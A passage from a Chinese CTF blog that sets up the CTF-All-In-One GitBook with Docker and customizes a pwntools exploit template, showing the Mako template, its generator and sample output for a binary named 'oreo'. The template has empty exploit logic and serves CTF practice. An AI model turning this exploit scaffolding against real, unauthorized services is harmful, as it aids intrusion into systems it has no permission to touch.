class="name">a</span> <span class="attr">class</span>=<span class="string">"lib-item &#123;&#123; 'active' if lib_name == lib &#125;&#125;"</span>&gt;</span></span><br><span class="line">                  &#123;&#123; lib_name &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">          &#123;% if symbols %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title panel-title-inline"</span>&gt;</span>&#123;&#123; lib &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"panel-title-right"</span> <span class="attr">href</span>=<span class="string">"/d/&#123;&#123; lib &#125;&#125;.so"</span>&gt;</span>Download<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-condensed table-hover"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Symbol<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Offset<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Difference<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                &#123;% for name, ofs in symbols %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span> <span class="attr">class</span>=<span class="string">"mono-font symbol-row"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose-base"</span> <span class="attr">class</span>=<span class="string">"symbol-radio"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-name"</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-ofs"</span>&gt;</span>&#123;&#123; '0x%06x' | format(ofs) &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-diff"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">              <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">"/d/&#123;&#123; lib &#125;&#125;.symbols"</span>&gt;</span>All symbols<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"text-muted"</span>&gt;</span>Database updated on May 23, 2018.<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='main.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    &#123;% <span class="keyword">for</span> name, addr <span class="keyword">in</span> query.items() %&#125;</span></span><br><span class="line"><span class="actionscript">    add_query(<span class="string">"&#123;&#123; name &#125;&#125;"</span>, <span class="string">"&#123;&#123; addr &#125;&#125;"</span>);</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='names.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">    set_autocomplete(names);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="本地搭建ctf-all-in-one"><a href="#本地搭建ctf-all-in-one" class="headerlink" title="本地搭建ctf-all-in-one"></a>本地搭建ctf-all-in-one</h2><p><a href="https://github.com/firmianay/CTF-All-In-One" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One</a></p>
<h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><p>git clone <a href="https://github.com/firmianay/CTF-All-In-One" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One</a></p>
<h3 id="GitBook基础"><a href="#GitBook基础" class="headerlink" title="GitBook基础"></a>GitBook基础</h3><p>README.md和SUMMARY.md<br>必备文件</p>
<h3 id="利用Docker安装Gitbook"><a href="#利用Docker安装Gitbook" class="headerlink" title="利用Docker安装Gitbook"></a>利用Docker安装Gitbook</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search gitbook <span class="comment">#可以查看，我用了最高星的那个</span></span><br><span class="line">docker pull fellah/gitbook</span><br></pre></td></tr></table></figure>

<p>先到项目的目录下<br>然后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v <span class="variable">$PWD</span>:/srv/gitbook -v <span class="variable">$PWD</span>/html:/srv/html fellah/gitbook gitbook build . /srv/html</span><br></pre></td></tr></table></figure>
<h3 id="展示Gitbook文件"><a href="#展示Gitbook文件" class="headerlink" title="展示Gitbook文件"></a>展示Gitbook文件</h3><p>因为生成的是html静态页面所以需要一个web服务来显示，我用nginx</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx</span><br><span class="line">docker run --name ctf-all-in-one -v /<span class="variable">$PWD</span>/html:/usr/share/nginx/html -d -p 4102:80 nginx</span><br></pre></td></tr></table></figure>
<p>这样就搭建完成了</p>
<p>访问你自己的4100-4102端口看下，是否成功了</p>
<h3 id="下载ctf-challenge，例题以及exp"><a href="#下载ctf-challenge，例题以及exp" class="headerlink" title="下载ctf-challenge，例题以及exp"></a>下载ctf-challenge，例题以及exp</h3><p>git clone <a href="https://github.com/ctf-wiki/ctf-challenges" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges</a><br>这个说不定哪天就用上了，说不准</p>
<h2 id="exp模板构建"><a href="#exp模板构建" class="headerlink" title="exp模板构建"></a>exp模板构建</h2><p>因为要快速做题，每次重复的部分整合起来比较好，所以便研究下exp模板如何弄，我是通过修改pwntools里自带的exp模板，生成自己专属的模板的，我建议都弄成自己的exp模板类型吧，因为每个人代码风格不一样，没必要一定用大佬的模板，当然有可能大佬的模板好，但不一定适合自己</p>
<h3 id="模板位置"><a href="#模板位置" class="headerlink" title="模板位置"></a>模板位置</h3><p>第一个是模板的具体内容，第二个是生成模板的方法</p>
<ul>
<li>pwnup.mako</li>
<li>template.py</li>
</ul>
<p>你可以find / -name 名称<br>找到具体位置，最好先备份一份</p>
<p>具体配置自行配置，因为每个人风格不同</p>
<h3 id="pwntools-exp模板自定义"><a href="#pwntools-exp模板自定义" class="headerlink" title="pwntools exp模板自定义"></a>pwntools exp模板自定义</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;%page args=<span class="string">"binary, host=None, port=None, libc=None, local=True"</span>/&gt;\</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.context <span class="keyword">import</span> context <span class="keyword">as</span> ctx</span><br><span class="line"><span class="keyword">from</span> pwnlib.elf.elf <span class="keyword">import</span> ELF</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.sh_string <span class="keyword">import</span> sh_string</span><br><span class="line"><span class="keyword">from</span> elftools.common.exceptions <span class="keyword">import</span> ELFError</span><br><span class="line"></span><br><span class="line">argv = list(sys.argv)</span><br><span class="line">argv[<span class="number">0</span>] = os.path.basename(argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> binary:</span><br><span class="line">       ctx.binary = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span> ELFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> binary:</span><br><span class="line">    binary = <span class="string">'/path/to/binary'</span></span><br><span class="line"></span><br><span class="line">exe = os.path.basename(binary)</span><br><span class="line"><span class="keyword">if</span> binary[<span class="number">0</span>] != <span class="string">'/'</span>:</span><br><span class="line">    binary = <span class="string">"./"</span> + binary</span><br><span class="line">binary_repr = repr(binary)</span><br><span class="line">libc_repr = repr(libc)</span><br><span class="line">%&gt;\</span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">%<span class="keyword">if</span> host:</span><br><span class="line">host = args.HOST <span class="keyword">or</span> $&#123;repr(host)&#125;</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">%endif</span><br><span class="line">%<span class="keyword">if</span> port:</span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> $&#123;port&#125;)</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">%endif</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">%<span class="keyword">if</span> ctx.binary:</span><br><span class="line">exe = $&#123;binary_repr&#125;</span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line">&lt;% binary_repr = <span class="string">'exe.path'</span> %&gt;</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>)</span><br><span class="line">exe = $&#123;binary_repr&#125;</span><br><span class="line">&lt;% binary_repr = <span class="string">'exe'</span> %&gt;</span><br><span class="line">%endif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line">%<span class="keyword">if</span> ctx.binary <span class="keyword">and</span> <span class="keyword">not</span> quiet:</span><br><span class="line"><span class="comment"># $&#123;'%-10s%s-%s-%s' % ('Arch:',</span></span><br><span class="line">                       ctx.binary.arch,</span><br><span class="line">                       ctx.binary.bits,</span><br><span class="line">                       ctx.binary.endian)&#125;</span><br><span class="line">%<span class="keyword">for</span> line <span class="keyword">in</span> ctx.binary.checksec(color=<span class="literal">False</span>).splitlines():</span><br><span class="line"><span class="comment"># $&#123;line&#125;</span></span><br><span class="line">%endfor</span><br><span class="line">%endif</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<p>具体语法可以理解为<br>%if args<br>content<br>%endif<br>content就是内容,args就是参数，通过这个方法进行模板的生成</p>
<h3 id="pwntools-exp模板生成方法"><a href="#pwntools-exp模板生成方法" class="headerlink" title="pwntools exp模板生成方法"></a>pwntools exp模板生成方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> absolute_import</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.commandline <span class="keyword">import</span> common</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> mako.lookup <span class="keyword">import</span> TemplateLookup</span><br><span class="line"></span><br><span class="line">parser = common.parser_commands.add_parser(</span><br><span class="line">    <span class="string">'template'</span>,</span><br><span class="line">    help = <span class="string">'Generate an exploit template'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'exe'</span>, nargs=<span class="string">'?'</span>, help=<span class="string">'Target binary'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--host'</span>, help=<span class="string">'Remote host / SSH server'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--port'</span>, help=<span class="string">'Remote port / SSH port'</span>, type=int)</span><br><span class="line">parser.add_argument(<span class="string">'--libc'</span>, help=<span class="string">'Remote libc version'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--local'</span>, help=<span class="string">'local debug'</span>, action=<span class="string">'store_true'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(args)</span>:</span></span><br><span class="line">    cache = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cache:</span><br><span class="line">        cache = os.path.join(context.cache_dir, <span class="string">'mako'</span>)</span><br><span class="line"></span><br><span class="line">    lookup = TemplateLookup(</span><br><span class="line">        directories      = [os.path.join(pwnlib.data.path, <span class="string">'templates'</span>)],</span><br><span class="line">        module_directory = cache</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    template = lookup.get_template(<span class="string">'pwnup.mako'</span>)</span><br><span class="line">    output = template.render(args.exe,</span><br><span class="line">                             args.host,</span><br><span class="line">                             args.port,</span><br><span class="line">                             args.libc,</span><br><span class="line">                             args.local,</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Fix Mako formatting bs</span></span><br><span class="line">    output = re.sub(<span class="string">'\n\n\n'</span>, <span class="string">'\n\n'</span>, output)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> output</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.stdout.isatty():</span><br><span class="line">        <span class="keyword">try</span>: os.fchmod(sys.stdout.fileno(), <span class="number">0700</span>)</span><br><span class="line">        <span class="keyword">except</span> OSError: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pwnlib.commandline.common.main(__file__)</span><br></pre></td></tr></table></figure>

<h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p>└──╼ $pwn template oreo –libc libc.so.6</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'oreo'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'oreo'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/pwn-heap-learn-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/pwn-heap-learn-1/" class="post-title-link" itemprop="url">pwn堆入门系列教程1</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:32:06" itemprop="dateModified" datetime="2019-10-30T17:32:06+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E5%A0%86/" itemprop="url" rel="index">
                    <span itemprop="name">堆</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>24k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>22 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
